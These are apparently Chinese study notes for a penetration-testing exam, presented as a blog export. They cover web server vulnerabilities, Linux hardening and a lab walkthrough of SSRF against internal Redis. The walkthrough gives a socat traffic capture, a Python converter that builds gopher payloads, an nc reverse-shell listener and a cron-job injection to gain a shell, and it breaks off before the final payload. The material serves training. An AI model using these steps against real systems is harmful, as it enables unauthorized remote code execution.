<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IIS:微软提供的服务器软件，包括web、ftp、smtp等组件</span><br><span class="line">常见漏洞：IIS短文件名、IIS解析漏洞、IIS6.0远程代码执行</span><br><span class="line"></span><br><span class="line">Apache：开源网页服务器，世界使用排名第一的web服务器</span><br><span class="line">常见漏洞：apache解析漏洞、日志文件漏洞</span><br><span class="line"></span><br><span class="line">Nginx：高性能HTTP和反向代理服务器，也是IAMP&#x2F;POP3&#x2F;SMTP服务器</span><br><span class="line">常见漏洞：Nginx解析漏洞、整数溢出漏洞</span><br><span class="line"></span><br><span class="line">Tomcat：轻量级开源web应用服务器，开发和调试JSP程序首选</span><br><span class="line">常见漏洞：tomcat弱口令、tomcat远程代码执行、本地提权</span><br><span class="line"></span><br><span class="line">weblogic：基于JAVAEE架构的中间件，用于管理大型分布式web应用的java应用服务器</span><br><span class="line">常见漏洞：java反序列化、SSRF</span><br></pre></td></tr></table></figure>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>数据库是按照数据结构来组织、存储和管理数据的仓库</p>
<p>结构化查询语言：简称SQL，用于存取数据以及查询、更新和管理关系数据库系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库分类：Mysql、MSSQL、Access、Oracle、Sqlite</span><br><span class="line"></span><br><span class="line">数据库管理软件：Phpmyadmin、navicat</span><br></pre></td></tr></table></figure>
<h4 id="开发语言及常见框架cms"><a href="#开发语言及常见框架cms" class="headerlink" title="开发语言及常见框架cms"></a>开发语言及常见框架cms</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">开发框架:codelgniter、thinkPHP</span><br><span class="line">cms：phpcms、dedecms、qibocms</span><br><span class="line"></span><br><span class="line">ASP</span><br><span class="line">cms：aspcms、动易cms、南方数据</span><br><span class="line"></span><br><span class="line">.NET</span><br><span class="line">cms：siteserver</span><br><span class="line"></span><br><span class="line">JSP</span><br><span class="line">开发框架：struts2、Spring MVC</span><br><span class="line">cms：jeecms、大汉cms</span><br></pre></td></tr></table></figure>
<h4 id="web常见架构"><a href="#web常见架构" class="headerlink" title="web常见架构"></a>web常见架构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LAMP</span><br><span class="line">Linux+Apache+Mysql+PHP:适用于大型网站架构，稳定性高，如企业网站</span><br><span class="line"></span><br><span class="line">WAMP</span><br><span class="line">windows+Apache+Mysql+PHP：适用于中小型网站</span><br><span class="line"></span><br><span class="line">其他组合：</span><br><span class="line">PHP+IIS</span><br><span class="line">ASP+IIS</span><br><span class="line">.NET+IIS</span><br><span class="line">JSP+Tomcat</span><br></pre></td></tr></table></figure>
<h4 id="安全术语"><a href="#安全术语" class="headerlink" title="安全术语"></a>安全术语</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后门：方便以后再次进入或控制系统</span><br><span class="line"></span><br><span class="line">webshell：以asp、php、jsp或cgi等网页文件形式存在的一种命令执行环境，是一种网页后门</span><br><span class="line"></span><br><span class="line">0day漏洞：官方还没有发现或者发现还没有开发出补丁的漏洞</span><br><span class="line"></span><br><span class="line">exploit：简称exp，漏洞利用</span><br><span class="line"></span><br><span class="line">提权：提升在服务器中的权限</span><br><span class="line"></span><br><span class="line">跳板：为了隐藏自己的地址，让别人无法查找到自己的位置</span><br><span class="line"></span><br><span class="line">拖库：网站被入侵后，窃取其数据库</span><br><span class="line"></span><br><span class="line">社会工程学：利用人性的弱点，达到自身的目的</span><br><span class="line"></span><br><span class="line">APT攻击：高级持续性威胁，利用先进的攻击手段对特定的目标进行长期持续性的网络攻击行为</span><br></pre></td></tr></table></figure>
<p>基于应用层的攻击手段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">弱口令攻击</span><br><span class="line">配置缺陷</span><br><span class="line">应用漏洞</span><br><span class="line">SQL&#x2F;XSS等</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>基于网络主机的攻击手段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DDOS攻击</span><br><span class="line">远程溢出攻击</span><br><span class="line">ARP欺骗攻击</span><br><span class="line">僵木蠕</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>攻击代码共享站点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rapid7.com</span><br><span class="line">packetstormsecurity.com</span><br><span class="line">exploit-db.com</span><br><span class="line">securityfocus.com</span><br><span class="line">securityvulns.com</span><br></pre></td></tr></table></figure>
<h2 id="Linux操作系统安全"><a href="#Linux操作系统安全" class="headerlink" title="Linux操作系统安全"></a>Linux操作系统安全</h2><h4 id="Linux系统概述"><a href="#Linux系统概述" class="headerlink" title="Linux系统概述"></a>Linux系统概述</h4><p>安全原则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">纵深防御</span><br><span class="line">运用PDCA模型</span><br><span class="line">最小权限法则</span><br><span class="line">白名单机制</span><br><span class="line">避免通过隐藏来实现安全</span><br><span class="line">入侵检测</span><br><span class="line">不要信任基础设施</span><br><span class="line">不要信任服务</span><br><span class="line">交付时保持默认安全</span><br></pre></td></tr></table></figure>
<p>组织和管理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加强安全意识培训</span><br><span class="line">注意弱密码问题</span><br><span class="line">明令禁止使用破解软件</span><br><span class="line">组建合理的安全组织结构</span><br></pre></td></tr></table></figure>
<h4 id="Linux防火墙"><a href="#Linux防火墙" class="headerlink" title="Linux防火墙"></a>Linux防火墙</h4><h5 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h5><p>防火墙firewall支持ipv4与ipv6，并支持网桥，采用firewall-cmd或firewall-config(gui)来动态管理内核 netfilter的临时或永久的接口规则，并实时生效而无需重启服务。</p>
<p>zone</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop:丢弃所有包，不给回应</span><br><span class="line">block：拒绝所有外部发起的连接，允许内部的连接</span><br><span class="line">public：允许指定的进入连接</span><br><span class="line">dmz：允许受限制的进入连接</span><br><span class="line">work：允许受信任的计算机被限制的进入连接</span><br><span class="line">trusted：信任所有连接</span><br></pre></td></tr></table></figure>
<p>过滤规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source:根据源地址过滤</span><br><span class="line">interface：根据网卡过滤</span><br><span class="line">service：根据服务名过滤</span><br><span class="line">port：根据端口过滤</span><br><span class="line">icmp-block：icmp报文过滤</span><br><span class="line">masquerade：ip地址伪装</span><br><span class="line">forward-port：端口转发</span><br><span class="line">rule：自定义规则</span><br><span class="line"></span><br><span class="line">其中过滤规则优先级为：</span><br><span class="line">1.source</span><br><span class="line">2.interface</span><br><span class="line">3.firewalld.conf</span><br></pre></td></tr></table></figure>
<p>查看规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看运行状态</span><br><span class="line">firewall-cmd --state</span><br><span class="line"></span><br><span class="line">查看被激活的zone信息</span><br><span class="line">firewall-cmd --get-active-zones</span><br><span class="line"></span><br><span class="line">查看指定接口的zone信息</span><br><span class="line">firewall-cmd --get-zone-of-interface&#x3D;ens32</span><br><span class="line"></span><br><span class="line">查看指定级别的接口</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-interfaces</span><br><span class="line"></span><br><span class="line">查看指定级别的所有信息</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-all</span><br><span class="line"></span><br><span class="line">查看所有级别被允许的信息</span><br><span class="line">firewall-cmd --get-service</span><br><span class="line"></span><br><span class="line">查看重启后所有被永久放行的服务</span><br><span class="line">firewall-cmd --get-service --permanent</span><br></pre></td></tr></table></figure>
<p>管理规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">丢弃： firewall-cmd --panic-on</span><br><span class="line"></span><br><span class="line">取消丢弃: firewall-cmd --panic-off</span><br><span class="line"></span><br><span class="line">查看丢弃状态：firewall-cmd --query-panic</span><br><span class="line"></span><br><span class="line">更新规则，不重启服务：firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">更新规则，重启服务：firewall-cmd --complete-reload</span><br><span class="line"></span><br><span class="line">添加某接口到某信任等级，永久修改</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-interface&#x3D;eth0 --permanent</span><br><span class="line"></span><br><span class="line">设置public为默认的信任等级</span><br><span class="line">firewall-cmd --set-default-zone&#x3D;public</span><br></pre></td></tr></table></figure>
<p>管理端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">列出dmz级别的被允许的进入端口</span><br><span class="line">firewall-cmd --zone&#x3D;dmz --list-ports</span><br><span class="line"></span><br><span class="line">允许TCP8080端口至dmz级别</span><br><span class="line">firewall-cmd --zone&#x3D;dmz --add-port&#x3D;8080&#x2F;tcp</span><br></pre></td></tr></table></figure>
<h5 id="TCP-wrappers"><a href="#TCP-wrappers" class="headerlink" title="TCP wrappers"></a>TCP wrappers</h5><p>TCP wrappers是工作在传输层的安全工具，主要功能是控制谁能访问，常见程序有rpcbind、vsftpd、sshd、telnet等。</p>
<p>TCP wrappers的使用主要是依靠两个配置文件/etc/hosts.allow,/etc/hosts.deny，用于拒绝和接受具有TCPwrappers控制的程序。</p>
<p>工作原理</p>
<p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802145131891.png" alt="image-20200802145131891"></p>
<p>Denyhosts配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_log&#x3D;&#x2F;var&#x2F;log&#x2F;secure   &#x2F;&#x2F;日志存放位置</span><br><span class="line">hosts_deny&#x3D;&#x2F;etc&#x2F;hosts.deny   &#x2F;&#x2F;检测到爆破后，指定在哪个配置文件中添加相应地址并禁止</span><br><span class="line">block_service &#x3D;sshd          &#x2F;&#x2F;指定封禁来源IP的哪些服务</span><br><span class="line">deny_threshold_invalid&#x3D;5     &#x2F;&#x2F;对于&#x2F;etc&#x2F;passwd下不存在的用户名暴力尝试，指定发现多少次封禁</span><br><span class="line">deny_threshold_root&#x3D;1        &#x2F;&#x2F;对root的暴力破解，指定发现多少次封禁</span><br><span class="line">hostname_lookup&#x3D;yes          &#x2F;&#x2F;是否启用来源IP到域名的解析</span><br></pre></td></tr></table></figure>
<h4 id="Linux用户安全"><a href="#Linux用户安全" class="headerlink" title="Linux用户安全"></a>Linux用户安全</h4><p>Linux用户管理涉及的文件：用户账号文件/etc/passwd、用户密码文件/etc/shadow、用户组文件/etc/group。</p>
<p>/etc/passwd格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：密码：用户ID、组ID、用户全称、主目录、登录shell</span><br></pre></td></tr></table></figure>
<p>/etc/shadow格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：密码：上次修改密码时间：两次修改密码间隔的最小天数：两次修改密码间隔的最大天数：提前几天警告用户密码过期：密码过期几天禁用用户：过期时间：保留字段</span><br></pre></td></tr></table></figure>
<p>/etc/group用户组文件</p>
<p>/etc/skel：在Linux系统新创建一个用户时，系统会自动把/etc/skel目录下的所有内容复制到新用户的主目录”/home/用户名下”</p>
<p>超级用户权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进程控制</span><br><span class="line">设备控制</span><br><span class="line">网络控制</span><br><span class="line">文件系统控制</span><br><span class="line">用户控制</span><br></pre></td></tr></table></figure>
<p>用户管理基本操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">增加用户：useradd</span><br><span class="line">为用户设置密码：passwd</span><br><span class="line">删除用户：userdel</span><br><span class="line">修改用户属性：usermod</span><br></pre></td></tr></table></figure>
<h5 id="用户密码管理"><a href="#用户密码管理" class="headerlink" title="用户密码管理"></a>用户密码管理</h5><p>设置密码复杂度authconfig，配置文件/etc/security/pwquality.conf</p>
<p>生成复杂密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keepass：图形界面</span><br><span class="line">openssl：openssl rand-base64 20</span><br><span class="line">pwgen：pwgen -c -n -y 12 1   </span><br><span class="line">-c至少一个大写字母</span><br><span class="line">-n至少一个数字</span><br><span class="line">-y至少一个特殊字符</span><br></pre></td></tr></table></figure>
<h5 id="账户安全"><a href="#账户安全" class="headerlink" title="账户安全"></a>账户安全</h5><p>使用下面的命令检查空口令账户是否存在：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F：&#39;($2&#x3D;&#x3D;&quot;!!&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
<p>检测UID为0的用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F:&#39;($3&#x3D;&#x3D;&quot;0&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<h4 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h4><p>在Linux系统中，文件系统采用树状层次的目录结构，最顶层是根目录，用”/“表示，往下延申其各级子目录。</p>
<p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802160959356.png" alt="image-20200802160959356"></p>
<p>文件系统安全</p>
<p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802161106546.png" alt="image-20200802161106546"></p>
<p>Linux主要文件系统类型</p>
<p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802161203483.png" alt="image-20200802161203483"></p>
<h5 id="系统文件属性"><a href="#系统文件属性" class="headerlink" title="系统文件属性"></a>系统文件属性</h5><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802162054144.png" alt="image-20200802162054144"></p>
<p>第一部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">由10个字符组成，第一个字符表示文件类型</span><br><span class="line">&quot;-&quot;表示普通文件</span><br><span class="line">d表示目录</span><br><span class="line">l表示链接文件</span><br><span class="line">s表示套接字文件</span><br><span class="line">p表示命名管道文件</span><br><span class="line">c表示字符设备文件</span><br><span class="line">b表示块设备文件</span><br></pre></td></tr></table></figure>
<p>第二部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以冒号分隔，冒号前是文件的所有者，冒号后是文件所有者的用户组</span><br></pre></td></tr></table></figure>
<p>第三部分：表示文件的硬链接数</p>
<p>第四部分：以字节为单位的文件大小</p>
<p>第5，6，7部分表示文件最后的更新时间</p>
<p>第8部分：文件名</p>
<h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5><p>Linux有4种基本系统文件类型：目录文件、普通文件、链接文件、特殊文件</p>
<p>通过ls -l命令可以返回文件的相关属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">普通文件：</span><br><span class="line">普通文件包括文本文件、程序代码文件、shell脚本、二进制可执行文件等</span><br><span class="line"></span><br><span class="line">目录文件：</span><br><span class="line">目录作为一个文件来对待，用d来表示，目录下可以包括文件和子目录</span><br><span class="line"></span><br><span class="line">链接文件：</span><br><span class="line">链接文件为一个指向文件的指针，通过链接文件，用户访问的将是指针指向的文件</span><br><span class="line"></span><br><span class="line">特殊文件：</span><br><span class="line">Linux中的特殊文件有三种。</span><br><span class="line">套接字文件socket：可以实现网络通信，标识值为s</span><br><span class="line">命名管道文件：可以实现进程间的通信，标识值为p</span><br><span class="line">设备文件：Linux为每个设备分配一个设备文件，存放在&#x2F;dev目录下，其中键盘属于字符设备，标识值为c</span><br><span class="line">内存、磁盘属于块设备文件，标识值为b</span><br></pre></td></tr></table></figure>
<p>文件和目录权限</p>
<p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802165836638.png" alt="image-20200802165836638"></p>
<h5 id="文件系统权限管理"><a href="#文件系统权限管理" class="headerlink" title="文件系统权限管理"></a>文件系统权限管理</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">更改文件和目录所有者：chown命令</span><br><span class="line">修改权限：chmod</span><br><span class="line">设置ACL：setfacl</span><br><span class="line">锁定文件：chattr</span><br><span class="line">设置默认权限：umask</span><br></pre></td></tr></table></figure>
<h4 id="Linux日志与审计"><a href="#Linux日志与审计" class="headerlink" title="Linux日志与审计"></a>Linux日志与审计</h4><h5 id="日志用途"><a href="#日志用途" class="headerlink" title="日志用途"></a>日志用途</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统审计：记录登录系统的用户和日常行为</span><br><span class="line">监测追踪：追踪溯源攻击者</span><br><span class="line">分析统计：系统性能、错误等统计</span><br></pre></td></tr></table></figure>
<p>Linux日志可以保存几乎所有的操作记录，Linux发行版默认的日志守护进程为rsyslog，位于/etc/rsyslog或/etc/rsyslogd，默认配置文件为/etc/rsyslog.conf。默认配置 下，日志文件都存放在”/var/log”目录下。</p>
<h5 id="Linux日志等级"><a href="#Linux日志等级" class="headerlink" title="Linux日志等级"></a>Linux日志等级</h5><p>Linux日志等级，priority表示产生日志的等级</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug:有调试信息，日志信息最多</span><br><span class="line">info：一般信息日志，最常用</span><br><span class="line">notice：最具重要性的普通条件的信息</span><br><span class="line">warning：警告级别</span><br><span class="line">err：错误级别，阻止某个功能或模块不能正常工作的信息</span><br><span class="line">crit：严重级别，阻止整个系统或软件不能正常工作的信息</span><br><span class="line">alert：需要理解修改的信息</span><br><span class="line">emerg：内核崩溃等严重信息</span><br><span class="line">none：什么都不记录</span><br><span class="line">从上到下，级别从低到高，记录的信息越来越少</span><br></pre></td></tr></table></figure>
<p>var/log下日志文件解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统引导日志：&#x2F;var&#x2F;log&#x2F;boot.log</span><br><span class="line"></span><br><span class="line">内核启动日志：&#x2F;var&#x2F;log&#x2F;dmesg</span><br><span class="line"></span><br><span class="line">系统日志：&#x2F;var&#x2F;log&#x2F;messages</span><br><span class="line"></span><br><span class="line">邮件系统日志：&#x2F;var&#x2F;log&#x2F;maillog</span><br><span class="line"></span><br><span class="line">FTP系统日志：&#x2F;var&#x2F;log&#x2F;xferlog</span><br><span class="line"></span><br><span class="line">安全信息：&#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">登录记录：&#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"></span><br><span class="line">RPM软件包：&#x2F;var&#x2F;log&#x2F;rpmpkgs</span><br><span class="line"></span><br><span class="line">cron计划任务日志：&#x2F;var&#x2F;log&#x2F;cron</span><br><span class="line"></span><br><span class="line">记录现在登录的用户：&#x2F;var&#x2F;run&#x2F;utmp</span><br><span class="line"></span><br><span class="line">记录所有用户登录和注销信息：&#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"></span><br><span class="line">记录最后登录信息：&#x2F;var&#x2F;log&#x2F;lastlog</span><br><span class="line"></span><br><span class="line">记录用户错误登录尝试：&#x2F;var&#x2F;log&#x2F;btmp</span><br></pre></td></tr></table></figure>
<h4 id="Rootkit与病毒木马检查"><a href="#Rootkit与病毒木马检查" class="headerlink" title="Rootkit与病毒木马检查"></a>Rootkit与病毒木马检查</h4><p>Rootkit是一种特殊的恶意软件。Rootkit主要功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐藏进程</span><br><span class="line">隐藏网络端口</span><br><span class="line">隐藏文件</span><br><span class="line">后门功能</span><br><span class="line">键盘记录器</span><br></pre></td></tr></table></figure>
<p>可以使用chkrootkit检查rootkit，官网为http:[]www.[]chkrootkit.org</p>
]]></content>
      <categories>
        <category>PTE</category>
      </categories>
      <tags>
        <tag>PTE</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞</title>
    <url>/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h4 id="什么是SSRF漏洞"><a href="#什么是SSRF漏洞" class="headerlink" title="什么是SSRF漏洞"></a>什么是SSRF漏洞</h4><p>SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801191249593.png" alt="image-20200801191249593"></p>
<p>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</p>
<h4 id="SSRF形成原因"><a href="#SSRF形成原因" class="headerlink" title="SSRF形成原因"></a>SSRF形成原因</h4><p>大都是由于服务端提供了从其它服务器获取数据的功能，比如使用户从指定的URL web应用获取图片、下载文件、读取文件内容等。但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。</p>
<h4 id="SSRF和CSRF的区别"><a href="#SSRF和CSRF的区别" class="headerlink" title="SSRF和CSRF的区别"></a>SSRF和CSRF的区别</h4><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器。</p>
<p>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</p>
<h4 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h4><p>回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在服务器获取攻击者要求的URL后，把响应发送回攻击者。</span><br></pre></td></tr></table></figure>
<p>不回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者，需要通过抓包或查看服务器日志判断是否存在服务端请求伪造漏洞。</span><br></pre></td></tr></table></figure>
<h4 id="SSRF可以实现的攻击"><a href="#SSRF可以实现的攻击" class="headerlink" title="SSRF可以实现的攻击"></a>SSRF可以实现的攻击</h4><p>1.获取web应用可达服务器的banner信息（如软件开发商、软件名称等），以及收集内网web应用的指纹识别（如开放的端口、中间件版本等），根据这些信息再进行进一步的渗透。</p>
<p>2.攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，对有漏洞的内网web应用实施攻击获取webshell（如Struts2命令执行，discuz!论坛SSRF通过Redis实施getshell等）。</p>
<p>3.利用有脆弱性的组件结合ftp://，file:///，gopher://，dict://等协议实施攻击（如FFmpeg任意文件读取，XXE攻击等）。</p>
<h4 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h4><p>结合gopher协议攻击内网FTP、Telnet、Redis、FastCGI、Memcache，也可以进行get、post请求。</p>
<h2 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h2><h4 id="测试定时任务写shell"><a href="#测试定时任务写shell" class="headerlink" title="测试定时任务写shell"></a>测试定时任务写shell</h4><p>CentOS机器开启Redis服务，写定时任务到CentOS机器中。</p>
<p>1.Redis服务安装时默认绑定IP为127.0.0.1，此处不需要设置，查看Redis配置文件redis.conf：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find  &#x2F;  -name  redis.conf</span><br><span class="line">vi  &#x2F;root&#x2F;redis-5.0.4&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801192819048.png" alt="image-20200801192819048"></p>
<p>2.CentOS机器开启Redis服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;local&#x2F;bin</span><br><span class="line">.&#x2F;redis-server  &#x2F;root&#x2F;redis-5.0.4&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801192953504.png" alt="image-20200801192953504"></p>
<p>3.查看kaili攻击机的redis版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;redis&#x2F;</span><br><span class="line">.&#x2F;redis-server  –v</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193353596.png" alt="image-20200801193353596"></p>
<p>4.启动redis服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-server</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193447799.png" alt="image-20200801193447799"></p>
<p>5.另开启一个终端，测试启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;redis&#x2F;</span><br><span class="line">.&#x2F;redis-cli  ping</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193605433.png" alt="image-20200801193605433"></p>
<p>启动成功</p>
<p>6.在kali攻击机写一个redis反弹shell的bash脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi  shell.sh</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193743233.png" alt="image-20200801193743233"></p>
<p>保存退出</p>
<p>在Redis的第0个数据库中添加key为1，名为root的定时任务，value字段最后会多一个n是因为echo重定向最后会自带一个换行符，位置为CentOS机器的/var/spool/cron/，10.1.1.200为获取反弹shell的本地IP地址，666为反弹shell的监听端口，可随意设置。</p>
<h4 id="gopher协议攻击Redis"><a href="#gopher协议攻击Redis" class="headerlink" title="gopher协议攻击Redis"></a>gopher协议攻击Redis</h4><p>通过gopher协议攻击Redis，如果内网中的Redis存在未授权访问漏洞，当Redis服务以root权限运行时，利用gopher协议攻击内网中的Redis，通过写入定时任务可以实现反弹shell。</p>
<p>1.Kali攻击机另外开启一个终端，使用socat进行端口转发，获取Redis攻击的TCP数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat  -v tcp-listen:2333,fork  tcp-connect:127.0.0.1:6379</span><br></pre></td></tr></table></figure>
<p>将本地的2333端口转发到Redis服务器的6379端口，访问本地的2333端口其实是访问Redis服务器的6379端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行脚本：bash  shell.sh  127.0.0.1  2333</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801200548438.png" alt="image-20200801200548438"></p>
<p>捕获到的数据</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801201002550.png" alt="image-20200801201002550"></p>
<p>3.利用脚本将数据转换成适配于gopher协议的URL，转换规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果第一个字符是 &gt; 或者 &lt; ，则丢弃该行字符串，表示请求和返回的时间；</span><br><span class="line"></span><br><span class="line">如果前三个字符是 +OK，则丢弃该行字符串，表示返回的字符串；</span><br><span class="line"></span><br><span class="line">将\r字符替换成 %0d%0a；</span><br><span class="line"></span><br><span class="line">将空白行替换成 %0a。</span><br></pre></td></tr></table></figure>
<p>转化脚本如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import sys</span><br><span class="line">exp&#x3D;&#39; &#39;</span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">     for line in f.readlines():</span><br><span class="line">        if line[0] in &#39;&gt;&lt;+&#39;:</span><br><span class="line">           continue</span><br><span class="line">        elif line[-3:-1]&#x3D;&#x3D; r&#39;\r&#39;:</span><br><span class="line">        &#x2F;&#x2F;如果该行只有\r,将\r替换成%0a%0d%0a</span><br><span class="line">           if len(line)&#x3D;&#x3D;3:</span><br><span class="line">              exp&#x3D;exp+&#39;%0a%0d%0a&#39;</span><br><span class="line">           else:</span><br><span class="line">              line&#x3D;line.replace(r&#39;\r&#39;,&#39;%0d%0a&#39;)</span><br><span class="line">        &#x2F;&#x2F;去掉最后的换行符</span><br><span class="line">              line&#x3D;line.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">              exp&#x3D;exp+line</span><br><span class="line">        &#x2F;&#x2F;判断是否为空行，空行替换为%0a</span><br><span class="line">        elif line&#x3D;&#x3D; &#39;\x0a&#39;:</span><br><span class="line">            exp&#x3D; exp+&#39;%0a&#39;</span><br><span class="line">        else:</span><br><span class="line">            line&#x3D;line.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">            exp&#x3D;exp+line</span><br><span class="line">print exp</span><br></pre></td></tr></table></figure>
<p>4.将socat获取的数据保存为socat.log文件，然后执行脚本进行数据转换：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi  socat.log</span><br></pre></td></tr></table></figure>
<p>将socat捕获的数据粘贴到socat.log中</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211517869.png" alt="image-20200801211517869"></p>
<p>保存文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python  tran2gopher.py  socat.log</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211646528.png" alt="image-20200801211646528"></p>
<p>nc开启监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc  -lvvp  666</span><br></pre></td></tr></table></figure>
<p>5.攻击CentOS机器的Redis服务：</p>
<p>输入gopher://127.0.0.1:6379/_+数据转换的内容：</p>
